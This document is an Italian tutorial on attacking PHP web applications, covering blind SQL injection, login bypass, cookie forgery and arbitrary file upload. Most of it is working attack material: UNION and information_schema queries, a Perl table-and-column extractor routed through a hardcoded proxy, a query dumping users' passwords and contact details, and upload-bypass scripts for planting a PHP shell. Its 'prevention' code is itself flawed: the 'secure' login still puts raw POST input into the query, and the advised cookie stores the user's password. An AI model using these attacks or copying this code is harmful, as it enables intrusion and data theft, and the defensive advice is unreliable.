Questo paragrafo serve a spiegare come trovare falle di tipo SQL Injection senza aver accesso al codice sorgente, se si può dire, alla cieca !
Facciamo finta che il sito su cui vogliamo lavorare sia il nostro caro `www.sito.it`.
Inizialmente è bene navigarci un pò su, vedere come funziona. Già andando col cursore da browser sui vari link vediamo come nella barra cambiano i vari link, noi saremmo interessati a quelli a pagine dinamiche ovviamente. Altro modo per vedere su quali query lavorare, è quello di aprire il sorgente html, e vedere che link interni ci sono, ma per ovvi motivi, mi sembra molto più comodo farlo da browser.
Mettiamo il caso che navigando troviamo questo link:
`sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99`

Ovviamente da un link di questo tipo, capiamo che le variabili su cui possiamo lavorare sono:

Parametro | Valore | Tipo
--- | --- | ---
action | ciao | non numerico
id     | 1    | numerico
link   | no2  | alfanumerico
rel    | 99   | numerico

Come ho già spiegato nel paragrafo precedente, in SQL, quando deve venire assegnato un valore o una variabile a una colonna, se il valore deve essere numerico, la variabile non sarà contenuta tra gli apici `' '` , se invece ci si aspetta che la variabile abbia un valore non numerico o alfanumerico, la variabile verrà posta tra gli apici.

Ci si aspetta dunque, query di questo tipo, (immaginiamo siano SELECT):

Query | Query spiegata 
--- | --- 
`SELECT * from tabella where action = '$var' `  | Perchè ad action da GET viene assegnato `ciao`, che fino a prova contraria non è numerico
`SELECT * from tabella where id = $var`  | A `id` viene assegnato 1, valore numerico, nella maggioranza dei casi la variabile non sarà posta tra apici `' '`

Dunque provare di iniettare codice SQL a seguito di variabili con assegnazione numerica, è più conveniente, in quanto nella maggior parte dei casi la variabile a cui affideremo i valori da GET, non sarà tra apici, e dunque non avremmo il problema dei Magic Quotes.

Iniziamo a lavorare dunque sulel variabili di tipo numerico.

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=1`

Con questa richiesta abbiamo iniziato a lavorare sulla variabile rel, e abbiam iniettato il codice SQL ` and 1=1`  per rendere la query sempre vera. Questo è un test che ci serve per vedere cosa succede nella pagina. Se vediamo uscire a schermo errori, può essere che ci sia un controllo sulla variabile, e poichè ci si aspetta che il suo valore sia strettamente numerico, è stata applicata su di essa la funzione int(), che la forza a diventare numerica, dunque, non potremmo iniettare codice. Se con l' ` and 1=1` compaiono errori, ci possono essere svariati motivi, a noi interessa che non ci siano, e che inserendo dopo la variabile `1=1` la pagina resti uguale.

Per testare ora e avere la certezza che la query sia vulnerabile a SQL Injection, proviamo a inserire sempre su quella variabile uno statament che renda la query sempre falsa, per vedere cosa succede:

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2`

Se a questo punto vediamo la pagina cambiare, è molto facile trarre conclusioni, la pagina è vulnerabile. Perchè?

Abbiamo "testato" la pagina, inserendo nella query prima uno statamente che la renda sempre vera, (`and 1=1`), e poi uno che la renda smepre falsa (`and 1=2`).
Se con `and 1=1` la pagina è rimasta uguale, può voler dire che la condizione and 1=1 sia stata interpretata correttamente dall'SQL, ma per aver la certezza di poter inserivi codice (che sia interpretato ovviamente), bisogna poi provare con un `and 1=2`, infatti se la query è veramente vulnerabile, a questo punto l' `and 1=2` finirebbe dentro questa, e renderebbe la query falsa, in modo tale che questa non ritorni risultati, con il conseguente cambiamento della pagina.

Per chiarirvi le idee, un piccolo riassunto:

Condizione iniettata | Cosa aspettarsi 
--- | --- 
`?var=2 and 1=1` | La pagina deve rimanere uguale
`?var=2 and 1=2` | La pagina deve cambiare

Questo è il miglior tipo di test da fare per vedere se si riesce a manipolare le variabili, quindi le query, quindi effettuare iniezioni di codice SQL. Tuutavia c'è anche un altro modo, meno efficace. Se lo script è scritto in modo tale che, in caso di errore SQL, questo venga printato a schermo, è possibile cercar di fare generari errori SQL, per vedere se escono errori. Il classico carattere che si usa per un test di questo tipo, è l'apice  `'`.
Prendiamo come esempio il nostro caro sito.

`GET sito.it/archivio/page.php?id=99&ad=as90`

Proviamo con uan richiesta di questo tipo:

`GET sito.it/archivio/page.php?id=99'&ad=as90`

Come abbiamo visto, abbiamo iniettato : `id=99'`

Se vediamo apparire a schermo un errore SQL, il classico:
"`You have an error in your SQL syntax .....`" allora può essere che la pagina sia vulnerabile. Ma allo stesso modo, se lo script non è impostato di stampare errori, se vediamo che inserendo un apice la pagina cambia, può essere che si sia generato un errore, ma se non lo vediamo non vuol dire che non c'è, la query dunque potrebbe essere vulnerabile.

Ad ogni modo, se abbiamo visto che inserendo condizione vere come `1=1 `e false come `1=2` la pagina cambia, allora passiamo con i prossimi step.

La cosa fondamentale ora, è quella di capire quante colonne sono selezionate nella query. Per capire questo, procederemo in modo analogo.

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1`

E vediamo cosa succede, se la pagina è uguale a quando avevamo posto una condizione falsa, allora il numero delle colonne che abbiamo selezionato è sbagliato, se invece vediamo che la pagina torna uguale a come era con una condizione vera 1=1, allora abbiam trovato il numero di colonne.

Facciamo finta che con la richiesta appena mostrata, la pagina sia uguale a quando avevam posto una condizione falsa.. Proviamo a selezionare una colonna in più:

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1,2`

Ancora niente .. Continuiamo incrementando il numero di colonne fino a quando non noteremo che la pagina è tornata giusta, cioè uguale a quando avevamo iniettato `and 1=1`

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1,2,3`

Ancora niente ..

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1,2,3,4`

Ancora niente ..

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1,2,3,4,5`

Ancora niente ..

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1,2,3,4,5,6`

ET Voila, la pagina è tornata uguale a quando avevam posto la condizione sempre vera 1=1

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 union select 1,2,3,4,5,6`  e  `GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=1`
*PRODUCONO LA STESSA PAGINA* !!

Ora abbiamo capito che la query selezionava 6 colonne. A questo punto è bene vedere se si tratta di una semplice SQL Injection, o di una Blind SQL Injection. Per verificarlo, basta vedere se vengono stampate le rows o meno.

Poichè al numero 99 corrisponde un reale contenuto, con la nostra SQL Injection, visualizzeremo le rows selezionate dalla prima query. Poniamo allora un ` and 1=2` dopo il 99, in modo che la query non trovi una corrispondenza, e che stampi le rows corrispondenti alle colonen che abbiamo selezionato con la nostra injection.

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,5,6`

Se a schermo ora vediamo stampato un numero tra quelli delle nostre colonne, come un 1, un 2,3,4,5 e 6, allora può essere che la rows è stata stampata correttamente.

Facciam finta di aver visto stampato a schermo il numero 5. Proviamo a fare la seguente richiesta:

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,concat(0x3a,0x3a),6`

`0x3a,0x3a` dovrebbe causare la stampa a schermo di `::`

Se ora al posto del 5 vediamo `::` allora ci troviamo di fronte ad una SQL Injection, che printa le rows nella colonna 5. Ok, a questo punto dobbiamo capire come si chiamano le tabelle, le colonne, per poi estrarre i dati che più ci interessano.

Vediamo ora delle funzioni interessanti:
- `USER()`
- `VERSION()`
- `DATABASE()`

Le seguenti ci forniranno l'utente del database, la versione del SQL, e il nome del database.

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,VERSION(),6`

Printerà la versione del SQL in uso. Se la versione è > di 4, allora il database avrà al suo interno la tabella `information_schema`. Questa tabella, di vitale importanza nel nostro caso, ci consente di venire a conoscenze di informazioni relative a tabelle e colonne di un database.

Ad esempio:

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,table_name,6 from information_schema.tables`

Prenderà dalla tabella information_schema la prima tabella: in `information_schema` infatti la colonna sappresentante le tabelle è: `table_name`, quella rappresentante le colonne: `column_name`
In `information_schema` infatti vi sono gli elenchi ordinati di tutte le tabelle del database, e le colonne di ogni tabella del database. Grazie a `information_schema` riusciremo dunque a trovare tabelle e colonne interessanti.

Quindi:

Iniezione | Effetto
--- | --- 
`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,table_name,6 from information_schema.tables`   | Printa la prima tabella del database
`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,column_name,6 from information_schema.columns` | Printa la prima colonna del database

Poichè nella maggioranza dei casi verrà stampato solo il primo risultato, ho scritto uno script che permette di estrarre (sempre sotto proxy) tutte le tabelle e colonne da un database, sempre da SQL Injection.


*SQL Tables&Columns Extractor (LIMIT) -> SQL_T_C.pl*
```perl
#!/usr/bin/perl

# Estrattore di tabelle e colonne con LIMIT
# di Osirys, Giovanni Buzzin

use HTTP::Request;
use LWP::UserAgent;

$max   = 10000;
$proxy = "212.93.193.72:443";

my $site_t = " union select 1,concat(0x3a6f776e65643a,table_name,0x3a6f776e65643a),3,4,5,6 from information_schema.tables limit ";   # Da modificare con la propria SQL Injection
my $site_c = " union select 1,concat(0x3a6f776e65643a,column_name,0x3a6f776e65643a),3,4,5,6 from information_schema.columns limit "; # Da modificare con la propria SQL Injection

print "\n--------------------------\n".
      "    SQL T-C Ext (Limit)  \n".
      "        by Osirys        \n".
      "--------------------------  \n\n";

&default;

$site_t =~ /http:\/\/(.+)\//;
$host = $1;
$host =~ /www\.(.+)/;
$host_ = $1;
$host_ =~ s/\///;
$fname = $host_.".txt";

print "[*] Extracting datas from: $host\n";
print "[*] Using $proxy as proxy ..\n";
print "\n[*] Getting Tables ..\n";

own("tables");
&default;
push(@data,"\n\n#################################################\n");
push(@data,"#################################################\n\n");
print "\n[*] Getting Columns ..\n";
own("columns");

open($file,">>",$fname);
foreach my $e(@data) {
    print $file "$e\n";
}
close($file);

sub own() {
    my($kind_s) = @_;
    if ($kind_s =~ /tables/) {
        $site = $site_t;
        $name = "Table";
    }
    elsif ($kind_s =~ /columns/) {
        $site = $site_c;
        $name = "Column";
    }
    while (($lim_1 <= $max)&&($stop != 1)) {
        if (($lim_1 % 1 == 0)||($lim_1 == 0)) {
            $no_ = 0;
            my $link = $site.$lim_1.",".$lim_2;
            my $re = get_req($link);
            if ($re =~ /:owned:(.+):owned:/g) {
                $no--;
                print "$name: $1\n";
                push(@data,"$name: $1");
            }
            else {
                $lim_2++;
                $no++;
                $no_ = 1;
            }
            while ($re =~ m/:owned:(.+):owned:/g) {
                print "$name: $1\n";
                push(@data,"$name: $1");
            }
            if ($no >= 5) {
                $stop = 1;
            }
        }
        if ($no_ != 1) {
            $lim_1++;
        }
    }
}

sub default {
    $lim_1 = 0;
    $lim_2 = 1;
    $stop  = 0;
    $no    = 0;
}

sub get_req() {
    $link   = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua  = LWP::UserAgent->new();
    $ua->proxy('http', "http://".$proxy);
    $ua->timeout(4);
    my $response = $ua->request($req);
    return($response->content);
}
```

Grazie a questo script, otterrete dunque l'elenco di tutte le tabelle e colonne del database. Mettiamo il caso che tra le tabelle troverete la tabella "user", e tra le tante colonne: "user","pwd","mail","phone"

Potrete iniziare a estrarre i dati:

`GET sito.it/news/news.php?action=ciao&id=1&link=no2&rel=99 and 1=2 union select 1,2,3,4,concat(user,0x3a,pwd,0x3a,mail,0x3a,phone),6 from user`

Se vedrete stampato un solo risultato, cioè quello di indice 0, allora per estrarre tutte le informazioni degli user della tabella user potrete usare lo script che vi ho mostrato prima: *sql_dump.pl*

## Prevenzione

Prevenire questa vulnerabilità è molto semplice. Di solito, se la variabile immessa dall'utente deve essere per forza un numero, come nel caso del news, per prevenire SQL Injections i programmatori stabiliscono o pongono la funzione `int()` alle variabili immesse dall'utente, "forzando" la trasformazione di questa in un numero intero. Nel caso di un login questo tipo di controllo non può essere effettuato, in quanto username e password saranno sempre di tipo alfanumerico, non strettamente numerico. Di conseguenza bisogna usare delle funzioni diverse, funzioni di escape. Nell'sql, quando una variabile non è numerica, viene inserita nella query tra due apici `'$variabile'`, e poichè, per bypassare l'autenticazione, bisognerebbe utilizzare un apice `'`, per prevenire l'attacco basterebbe "annullare" l'apice con un backslash `\`.

Una classica query di login si presenta in questo modo:
```
SELECT * FROM TABELLA WHERE `username` = '".$_POST['username']."' AND `password` = '".$_POST['password']."'
```

`$_POST['username']` è posta tra due `''`, quindi per bypassare il login sarebbe necessario inserire un `'`. Mettendo il caso che `POST['username']` sia: `' or '1=1` il bypass sarebbe possibile, ma se lo script riuscisse ad annullare gli apici, il bypass non avverrbbe più. Questo può avvenire con una espressione regolare, cioè se lo script trova un `'` nella variabile immessa dall'utente, la sostituisce, oppure con le funzioni di escape del mysql:
`addslashes()` e `mysql_real_escape_string()`. Queste funzioni, messe a disposizione dall'SQL, consentono l'escape di caratteri speciali, come nel nostro caso `'`.

In caso di Magic Quotes ON, un carattere speciale sarebbe immediatamente preceduto da una backslash, e se quindi, la variabile venisse passata alla funzione `mysql_real_escape_string()` vedremmo aggiunto un ulteriore backslash di escape inutile. Dunque, per preveire una falla di tipo auth bypass nel modo più corretto, bisognerebbe fare prima un controllo sulla funzione Magic Quotes. In caso questa sia ON, bisognerebbe passare i parametri alla funzione `stripslashes()`, in modo da eliminare la backslash aggiunta di default dal Magic Quotes, per poi ripassare la variabile alla funzione `mysql_real_escape_string()`.
Vediamo un esempio di login sicuro:

*login.php*
```php
<?php

//code

if(get_magic_quotes_gpc()) { // SE MAGIC QUOTES SONO ON, PRIMA TOGLIAMO LA BACKSLASH, PER POI RIAGGINGERLA  
    $username  = stripslashes($_POST['username']);
    $password  = stripslashes($_POST['password']);
    $username  = mysql_real_escape_string($_POST['username']);
    $password  = mysql_real_escape_string($_POST['password']);

}
else {
    $username  = mysql_real_escape_string($_POST['username']);
    $password  = mysql_real_escape_string($_POST['password']);
}

$query = "SELECT * FROM ".$member_admin." WHERE `username` = '".$_POST['username']."' AND `password` = '".$_POST['password']."' ";

mysql_query($query);

//code

```

Se invece si ha una query di questo tipo:

`SELECT * FROM news WHERE id = $var`

E' chiaro che il programmatore si aspetta una valore di id strettamente numerico, anche eprchè $var non è posta tra apici. A questo punto, per rendere la query sicura, basta fare questo check:
```php
if (is_numeric($_GET[id]) {
    $var = $_GET[id];
    $query = "SELECT * FROM news WHERE id = $var";
}
```

In questo modo, la query viene dichiarata e poi inviata al database sollo se id è numerico. Dunque:

Query | Query spiegata 
--- | --- 
`GET sito.it/page.php?id=ciao` | la query non verrà eseguita perchè ciao non è numerico
`GET sito.it/page.php?id=222` | la query verrà eseguita perchè 222 è numerico

Un altro cheek possibile, è l'`int()`. Si può applicare a query dove ci si aspetta una variabile con valore strettamente numerico. Vediamo:

`SELECT * FROM asd WHERE id = ".$_GET[id]`

Per forzare `$_GET[id]` a diventare un numero interi, inviamolo alla funzione int():

`SELECT * FROM asd WHERE id = ".int($_GET[id])`

In questo modo, se inserissimo `ciao` in `id` , essendo non intero, verrebbo convertito in uno 0.


# Vulnerabilità legate al Logging

Su cms molti grossi, o su script di prevenzione di accesso non autorizzato, è necessaria la presenza di funzioni di log in.
Permettere cioè solo ad utenti registrati di vedere alcune pagine, o fare azioni particolari.
Ci sono per esempio dei movimenti che solo l'amministratore del sito può fare, per ovvi motivi di sicurezza, quindi una funzione di log in torna utile.
Ci sono ora delle vulnerabilità legate alle funzioni di log in, che posso essere sfruttate per ottenere privilegi di amministratore del sito  o di un un utente registrato senza conoscere la sua username o password.
Iniziamo con una comune vulnerabilità, nota come: Authority Bypass oppure Admin Login Bypass.

## Authority Bypass via SQLi

Questo vulnerabilità altro non è che una SQL Injection, ovvero iniezione di codice SQL. Una vulnerabilità di questo tipo affligge i form e gli script di autenticazione, chiariamo un pò il concetto:

quando l'user metterà il proprio username e la propria password nel form di login, questi dati verranno inviati a una query sql, che farà un controllo nel database per vedere se l'username e la password immessi dall'utente sono corretti. Ma se l'utente invece di inserire un vero username, o una vera password, inserisce una stringa di codice SQL ? Andiamo a vedere..

Per mostrarvi qualche esempio pratico, riporto direttamente vulnerabilità di Auth Bypass che ho trovato in alcune Web Application.

La pagina /admin/index.php
presentava questo codice:

```php
if($_GET['menu'] != 'madmin')
  {
  if(isset($_POST['username']) && isset($_POST['password']))
    {
      $query = "SELECT * FROM ".$member_admin." WHERE `username` = '".$_POST['username']."' AND `password` = '".$_POST['password']."' ";
```

Come si può vedere, i dati immessi dall'utente via POST venivano direttamente inseriti in una query SQL di tipo SELECT. Inserendo come username "hacker", e come password "13337", la query sarebbe diventata così:
```
SELECT * FROM ".$member_admin." WHERE `username` = 'hacker' AND `password` = '13337'
```

Fino a qui è tutto ok, andiamo a vedere ora cosa succederebbe se inserissimo del codice SQL.

`' or '1=1` --> Codice da inserire nel form dell'username
`xxx `     --> Codice da inserire nel form della password

La query diventerebbe:
```
SELECT * FROM ".$member_admin." WHERE `username` = '' or '1=1' AND `password` = 'xxx'
```

La disgiunzione inclusiva OR è uguale al legame logico VEL e restituisce TRUE se una delle due condizioni è vera.
Di conseguenza, essendo `1=1` una condizione sepre vera, la query diventerebbe vera e quindi l'user riucirà a loggarsi senza conoscere la password.

### Prevenzione

Vedi prevenzione in: SQL Injection



## Insecure Cookie Handling (ICH)


Questa vulnerabilità è legata ai COOKIE. Spero voi tutti sappiate cosa siano, ad ogni modo ora vi fornisco un rapida spiegazione.
Quando un utente effettua correttamente il log in, per evitare che questo debba rimettere i propri dati ogni volta, viene impostato un cookie, un elemento che permetterà allo script di riconoscere se un utente si è gia loggato o no.

Diamo ora la definizione più rigorosa di Cookie:

I cookie HTTP, più comunemente denominati Web cookies, tracking cookies o semplicemente cookie, sono frammenti di testo inviati da un server ad un Web client (di solito un browser) e poi rimandati indietro dal client al server - senza subire modifiche - ogni volta che il client accede allo stesso server. I cookie HTTP sono usati per eseguire autenticazioni e tracking di sessioni e memorizzare informazioni specifiche riguardanti gli utenti che accedono al server, come ad esempio i siti preferiti o, in caso di acquisti on-line, il contenuto dei loro "carrelli della spesa" (shopping cart). Il termine "cookie" - letteralmente "biscotto" - deriva da magic cookie, concetto ben noto in ambiente UNIX che ha ispirato sia l'idea che il nome dei cookie HTTP.

Vediamo ora qualche codice usante i cookie.

log_in.php
```php
<?php
// code
// code
// $user e $pass sono i rispettivi user e pass inseriti nel login
if (($user == $username)&&($pass = $password)) {
    // Username e Password sono corrette
    setcookie("Valido",$username,time);
    setcookie("Password,$password,time);
    // fà qualcosa
}
else {
    echo "Accesso Negato";
}
```

In questo spezzone di codice si può vedere come il cookie viene impostato se l'utente si logga correttamente.
Il Cookie ha la seguente sintassi:
`("Nome_del_cookie","contenuto","scadenza");`

Il cookie ha un'importanza abbastanza rilevante. Un utente, prima di loggarsi nel sito, non possiede nessun cookie, andando infatti nella pagina di log in, lo script non ne individuerà alcuno, e così capirà che l'utente non si è loggato in precedenza.
Una volta che l'utente effettua il login correttamente, viene impostato un COOKIE con determinato nome,contenuto e scadenza, così la prossima volta che l'utente tornerà sul sito, lo script riconoscerà il cookie, e lo lascierà proseguire senza chiedergli nuovamente i dati di accesso.

E se un cookie venisse impostato con dei dati arbitrari? A breve verrà illustrata la vulnerabilità.

*log_in_ICH.php*
```php
<?php
// code
// code
// $user e $pass sono i rispettivi user e pass inseriti nel login
if (($user == $username)&&($pass = $password)) {
    // Username e Password sono corrette
    setcookie("Valido","valido",time);
    // fà qualcosa
}
else {
    echo "Accesso Negato";
}
```

Leggendo il pezzo di codice appena illustrato, con un pizzico di ingegno si scoprirà che esso è vulnerabile. Quando l'utente fornisce username e password corrette, un cookie verrà creato. Ma come? Il cookie creato avrà titolo "Valido", e contenuto "valido". Questo ci dovrebbe far capire un sacco di cose! Creandoci manualmente un cookie con quel nome e contenuto, saremmo in grado di "bypassare" il login.

Lo script infatti, riconoscerà il nostro cookie, e ci farà entrare automaticamente senza richiederci username e password. La vulnerabilità appena descritta è l'Insecure Cookie Handling. Può essere considerata un bypass, in quanto ci consentirà di loggarci senza fornire alcun dato.

I cookie possono essere creati in vari modi, da semplici script scritti in vari linguaggi di programmazione, oppure manualmente. Se si usa Mozilla Firefox, consiglio l'addon https://addons.mozilla.org/it/firefox/addon/573.
Questo script altro non è che un cookie editor. Sarà in grado di prendere i vostri cookie, salvarli, e vi permetterà di modificarli, crearli ed eliminarli.


### Prevenzione

Per proteggersi da questo pericoloso tipo di vulnerabilità, è sufficente porre come titolo o contenuto del cookie un valore dinamico, non statico. Vediamo qualche esempio di codice sicuro.

*log_in_ICH.php*
```php
<?php
// code
// code
// $user e $pass sono i rispettivi user e pass inseriti nel login
if (($user == $username)&&($pass = $password)) {
    // Username e Password sono corrette
    setcookie("Valido","$password",time);
    // fà qualcosa
}
else {
    echo "Accesso Negato";
}

```

Il cookie ora creato risulta sicuro, in quanto avrà come contenuto la password dell'utente. Il Cookie appena creato non sarà dunque vulnerabile a bypass poichè dovremmo conoscere la password dell'utente per creare il cookie corretto.

Ponendo l'username dell'utente come titolo o parte del contenuto del cookie, si renderebbe per la maggior parte dei casi lo script vulnerabile, in quanto nella maggior parte dei casi nei cms o negli script php è possibile senza alcun problema venire a conoscenza del nome di un utente.

*Riassunto*
Per difendersi da questa pericolosa vulnerabilità, basta evitare di usare nel Cookie elementi conoscibili da terzi utenti. Per rendere dunque sicuro il Cookie usiamo sempre la password dell'utente come contenuto, oppure la sessione dell'utente.


# Arbitrary File Upload


Come si può sapere, in php in molti casi risulta molto utile permettere all'utente di caricare file su un sito. Immaginiamoci i cms come le foto gallery, quegli script che permettono all'utente di caricare immagini, foto sul sito, per poi vederle. Sembrano tutte cose molto carine, ma non si sa la pericolosità che queste nascondo dietro se insicure.
Immaginatevi che l'upload in uso non sia sicuro, e che si possa caricare sul server qualsiasi file si voglia. Si potrà caricare dunque una shell in php, e prendere controllo del sito, in quanto si potrà vedere i file in esso presente, modificarli, e quant'altro. Questa vulnerabilità è dunque estremamente pericoloso.

## Analisi di codice
Un upload risulta insicuro quando non ci sia un controllo sull'estensione del file da caricare. Opportunamente, andrebbe bene perfino un controllo sugli utenti.
Consideriamo che l'upload in uso sia sicuro, e che non permettà l'upload di file con estione diversa dal `.png .jpg .gif`.

Si potrà dunque caricare sul server immagini con quell'estensione, ma se lo script fosse vulnerabile a Local File Inclusion?
Esistono dei programmi che permettono di scrivere all'interno di un immagine codice di scripting.
Si potrebbe dunque iniettare codice php malevolo all'interno dell'immagine, e poi includerla quindi eseguirla con la LFI, in questo modo il codice php presente nell'immagine verrà eseguito.

Iniziamo con lo scrivere il form per l'upload.
*form.html*
```html
<form name ="upload" action ="upload.php" method="POST" ENCTYPE="multipart/form-data">
Select your file to upload:
<input type="file" name="userfile">
<input type="submit" name="upload" value="upload">
</form>
```

Questo è il form html, vediamo ora il puro script dedicato all'upload.

Iniziamo col capire quando un upload non è sicuro:

*upload.php*
```php
<?php

$upload_dir = $_SERVER["DOCUMENT_ROOT"] . "/upload";

// code

if(@is_uploaded_file($_FILES["upfile"]["tmp_name"])) {
@move_uploaded_file($_FILES["upfile"]["tmp_name"], "$upload_dir/$_FILES["upfile"]["name"]")
or die("Impossibile caricare il file");
}
else {
 die("Problemi nell'upload del file " . $_FILES["upfile"]["name"]);
}

echo "L'upload del file " . $_FILES["upfile"]["name"] . " è avvenuto correttamente";

?>
```

Come si può facilmente notare, non c'è nessun controllo sull'estensione del file che si sta per caricare, quindi sarà possibile caricare un file `.php`. La pericolosità di questo bug è enorme, in quanto basterebbe caricare un semplice file `.php` vulnerabile a Remote Command Execution, per rendere il sito vulnerabile. Basterebbe caricare un file vulnerabile a RFI, per rendere il sito vulnerabile. Oppure basterebbe caricarci una shell come la r57 o la c99, con estensioni `.php`, per fare "quello che si vuole" del povero sito.

Vulnerabilità di questo tipo sono estremamente evitabili, basterebbe fare degli opportuni controlli.

I programmatori php hanno allora pensato a un cheek di sicurezza, quello ovvero di controllare il tipo del file che l'user sta tentando di caricare. Vediamone un esempio:

*upload.php*
```php
<?php
$allowed_types = array("image/gif","image/x-png","image/pjpeg","image/jpeg");
if(!in_array($_FILES["upfile"]["type"],$allowed_types)) {
die("Tipo del file non consentito, sono ammessi solo i seguenti: " . implode(",", $allowed_types) . ".");
}
$upload_dir = $_SERVER["DOCUMENT_ROOT"] . "/upload";
// code
if(@is_uploaded_file($_FILES["upfile"]["tmp_name"])) {
@move_uploaded_file($_FILES["upfile"]["tmp_name"], "$upload_dir/$_FILES["upfile"]["name"]")
or die("Impossibile caricare il file");
}
else {
 die("Problemi nell'upload del file " . $_FILES["upfile"]["name"]);
}
echo "L'upload del file " . $_FILES["upfile"]["name"] . " è avvenuto correttamente";
?>
```

Come si può vedere, in questo upload viene eseguito il controllo sul tipo del file. Se il file caricato è di tipo diverso da quelli presenti in 
`$allowed_types`, allora lo script uscirà a causa del `die()` .

A prima vista sembrerebbe un upload sicuro, in quanto permette l'upload di sole immagini. E se un attacker un po' di esperto cambiasse il tipo di file alla sua shell?
Esiste infatti una tecnica che eledue il controllo sul tipo del file, dunque l'attaccker riuscirà a caricare un file in `.php`.

Vediamo come si può raggirare questo check di sicurezza con uno script in perl.

## Sfruttare la falla
### Content-type bypass
*upload_sploit.pl*
```perl
#!/usr/bin/perl

use LWP;
use HTTP::Request::Common;

$ua = LWP::UserAgent->new;
$res = $ua->request(POST 'http://localhost/upload.php',
           Content_Type => 'form-data',
           Content      => [
                            userfile => ["shell.php", "shell.php", "Content-Type =>image/gif"]
                           ]
                  );
$response = $res->as_string();
print "$response\n";
```

Il seguente script non fà altro che cambiare il `Content-Type` del file che sta per essere caricato. Dunque, poichè il controllo è sul tipo di file, non sull'estensione, con questo "trucchetto" sarà possibile caricare sul server qualsiasi file.

**NOTA: Questo trucco, ovvero quello del cambio del content-type, è possibile solo per alcune versioni di PHP.


### Nascondere codice PHP in una immagine valida
Un altro metodo sicuro, o quasi, è quello di utilizzare la funzione del php `getimagesize()`.
Questa funzione non fà altro che dare come risultato il peso e il tipo dell'immagine. Vediamo un esempio pratico:

*upload_sicuro2.php*
```php
<?php

$imginfo = getimagesize($_FILES['userfile']['tmp_name']);
if ($imginfo['mime'] != 'image/gif' && $imginfo['mime'] != 'image/jpeg') {
echo "Accettiamo solo immagini GIF e JPEG";
exit;
}
$upload_dir = $_SERVER["DOCUMENT_ROOT"] . "/upload";
// code
if(@is_uploaded_file($_FILES["userfile"]["tmp_name"])) {
@move_uploaded_file($_FILES["userfile"]["tmp_name"], "$upload_dir/$_FILES["userfile"]["name"]")
or die("Impossibile caricare il file");
}
else {
 die("Problemi nell'upload del file " . $_FILES["userfile"]["name"]);
}
echo "L'upload del file " . $_FILES["userfile"]["name"] . " è avvenuto correttamente";

?>
```

A questo punto, pure impostando il `Content-Type` a immagine, l'upload non verrà effettuato proprio per il check che `getimasize()` fa.
Ad ogni modo, anche questo upload, che di per se è sicuro, può portare a una falla, andiamo a capire il perché.

Per chi non lo sappia, è possibile scrivere dei commenti all'interno di un immagine utilizzando svariati programmi reperibili sul web. Se noi scrivessimo ad esempio del codice php nei commenti di un immagine, e caricassimo questa sul server, la funzione `getimagesize()` riconoscerà la validità del tipo dell'immagine, e quindi la caricherà sul server. Con uno script perl, sarà possibile impostare il nome del file dopo l'upload, ponendolo con estensione.php.

Riepiloghiamo:

Abbiamo detto che è possibile scrivere codice php all'interno di un immagine. L'immagine avrà estensione `.gif` ad esempio, e quando verrà caricata la funzione `getimagesize() `ricnoscerà che il file è un immagine, quindi la caricherà. Il nostro script perl nel frattempo imposterà il nuovo nome per il file, cambiando l'estensione a `.php`. Ora, il file `.php` è sempre un'immagine, ma con al suo interno codice php. Riusciremo quindi ad eseguire il codice contenuto nell'immagine.
Vediamo ora lo script perl che ci permette di fare tutto questo:

*upload_sploit.pl*
```perl
#!/usr/bin/perl

use LWP;
use HTTP::Request::Common;

$ua = LWP::UserAgent->new;
$res = $ua->request(POST 'http://localhost/upload.php',
           Content_Type => 'form-data',
           Content      => [
                            userfile => ["img.gif", "img.php", "Content-Type =>image/gif"]
                           ]
                  );
$response = $res->as_string();
print "$response\n";
```

Notiamo:
`["img.gif", "img.php", "Content-Type =>image/gif"]`
`img.gif` è il nome del file da caricare, una valida immagine dunque con al suo interno il codice php nascosto. `img.php` è il nome dell'immagine dopo l'upload, e `Content-Type =>image/gif` indica il tipo di file.

Andando ora da browser sul file `img.php` sarà possibile eseguirne il codice php in esso contenuto.
Ad es: `http://sito.it/uploads/img.php`
Andando al seguente url, il file verrà eseguito e quindi anche il codice php al suo interno.

## Prevenzione
Dal momento che abbiamo visto come sia possibile aggirare il check sul file-type, bisognerà trovare un altro modo per bloccare upload indesiderati.
Un buon metodo è quello di fare un check sull'estensione del file, ponendo in un array ad esempio le estensioni non consentite, comparando così l'estensione del file da caricare con quelle non consentite, e in caso di matching, l'upload verrà bloccato. Andiamo a vedere un esempio pratico di cheek sull'estensione del file.

*upload_sicuro.php*
```php
<?php

$ext_denied = array(".php", ".php3", ".php4");
foreach ($ext_denied as $item) {
if (preg_match("/$item\$/i", $_FILES['userfile']['name'])) {
echo "Non accettiamo file .php";
exit;
}
}
$upload_dir = $_SERVER["DOCUMENT_ROOT"] . "/upload";
// code
if(@is_uploaded_file($_FILES["userfile"]["tmp_name"])) {
@move_uploaded_file($_FILES["userfile"]["tmp_name"], "$upload_dir/$_FILES["userfile"]["name"]")
or die("Impossibile caricare il file");
}
else {
 die("Problemi nell'upload del file " . $_FILES["userfile"]["name"]);
}
echo "L'upload del file " . $_FILES["userfile"]["name"] . " è avvenuto correttamente";

?>
```

